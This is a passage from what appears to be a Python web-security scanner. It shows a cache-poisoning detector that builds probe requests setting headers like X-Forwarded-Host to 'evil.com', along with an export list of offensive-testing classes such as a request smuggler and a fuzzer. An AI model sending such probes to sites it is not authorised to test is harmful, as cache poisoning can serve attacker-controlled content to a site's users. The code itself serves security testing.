        self.cache_headers = [
            'X-Forwarded-Host',
            'X-Forwarded-Scheme',
            'X-Forwarded-Proto',
            'X-Original-URL',
            'X-Rewrite-URL',
            'X-Host',
            'X-Forwarded-Server',
        ]
        
        self.cache_busters = [
            'cb', 'cachebuster', '_', 'nocache', 'rand'
        ]
    
    def get_test_requests(self, url: str) -> List[Dict]:
        """Generate cache poisoning test requests"""
        tests = []
        
        for header in self.cache_headers:
            tests.append({
                'url': url,
                'headers': {header: 'evil.com'},
                'test_header': header,
                'expected_reflection': 'evil.com'
            })
        
        return tests


# Export all classes
__all__ = [
    'NeuralEndpointPredictor',
    'SmartFuzzer', 
    'ResponseAnalyzer',
    'ContentAnalyzer',
    'GraphQLIntrospector',
    'CORSAnalyzer',
    'HTTPRequestSmuggler',
    'CachePoisioningDetector',
    'PredictedEndpoint',
    'FuzzPayload',
    'AnomalyResult',
]
